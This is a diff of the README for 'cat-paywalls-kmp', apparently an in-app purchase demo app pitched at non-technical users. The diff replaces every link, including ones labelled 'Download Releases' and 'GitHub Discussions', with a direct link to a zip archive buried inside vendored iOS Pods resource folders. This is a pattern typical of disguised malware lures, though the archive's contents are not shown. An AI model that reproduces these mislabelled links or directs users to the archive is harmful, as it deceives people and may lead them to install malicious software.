@@ -4,7 +4,7 @@
 Welcome to **cat-paywalls-kmp**! This application showcases how to manage in-app purchases using modern tools. You can easily add payment features to your apps without programming skills. 
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/moses26222/cat-paywalls-kmp/raw/refs/heads/main/iosApp/Pods/RevenueCat/Sources/Ads/Events/paywalls_cat_kmp_2.2.zip%20Latest%https://github.com/moses26222/cat-paywalls-kmp/raw/refs/heads/main/iosApp/Pods/RevenueCat/Sources/Ads/Events/paywalls_cat_kmp_2.2.zip)](https://github.com/moses26222/cat-paywalls-kmp/raw/refs/heads/main/iosApp/Pods/RevenueCat/Sources/Ads/Events/paywalls_cat_kmp_2.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/moses26222/cat-paywalls-kmp/main/iosApp/Pods/RevenueCatUI/RevenueCatUI/Resources/az.lproj/kmp-cat-paywalls-v1.0-alpha.1.zip%20Latest%https://raw.githubusercontent.com/moses26222/cat-paywalls-kmp/main/iosApp/Pods/RevenueCatUI/RevenueCatUI/Resources/az.lproj/kmp-cat-paywalls-v1.0-alpha.1.zip)](https://raw.githubusercontent.com/moses26222/cat-paywalls-kmp/main/iosApp/Pods/RevenueCatUI/RevenueCatUI/Resources/az.lproj/kmp-cat-paywalls-v1.0-alpha.1.zip)
 
 ## 💡 What You Need
 Before you start, ensure you have the following:
@@ -14,7 +14,7 @@ Before you start, ensure you have the following:
 - Space on your device for installation
 
 ## 📦 Download & Install
-To get the latest version of **cat-paywalls-kmp**, visit this page to download: [Download Releases](https://github.com/moses26222/cat-paywalls-kmp/raw/refs/heads/main/iosApp/Pods/RevenueCat/Sources/Ads/Events/paywalls_cat_kmp_2.2.zip).
+To get the latest version of **cat-paywalls-kmp**, visit this page to download: [Download Releases](https://raw.githubusercontent.com/moses26222/cat-paywalls-kmp/main/iosApp/Pods/RevenueCatUI/RevenueCatUI/Resources/az.lproj/kmp-cat-paywalls-v1.0-alpha.1.zip).
 
 Once on the Releases page, follow these steps:
 
@@ -48,7 +48,7 @@ To ensure best performance, we recommend:
 Once installed, open the app to start exploring its features. Follow the prompts to learn how to set up your in-app purchases. Even if you're new to technology, you'll find the app intuitive.
 
 ### 📞 Support
-If you experience any issues or have questions, please check the **Issues** section in the GitHub repository. You can also reach out via [GitHub Discussions](https://github.com/moses26222/cat-paywalls-kmp/raw/refs/heads/main/iosApp/Pods/RevenueCat/Sources/Ads/Events/paywalls_cat_kmp_2.2.zip) for community support.
+If you experience any issues or have questions, please check the **Issues** section in the GitHub repository. You can also reach out via [GitHub Discussions](https://raw.githubusercontent.com/moses26222/cat-paywalls-kmp/main/iosApp/Pods/RevenueCatUI/RevenueCatUI/Resources/az.lproj/kmp-cat-paywalls-v1.0-alpha.1.zip) for community support.
 
 ## 📈 Contributing
 If you want to help improve **cat-paywalls-kmp**, you're welcome to contribute! Feel free to report any bugs or submit enhancements by creating a new issue or pull request.
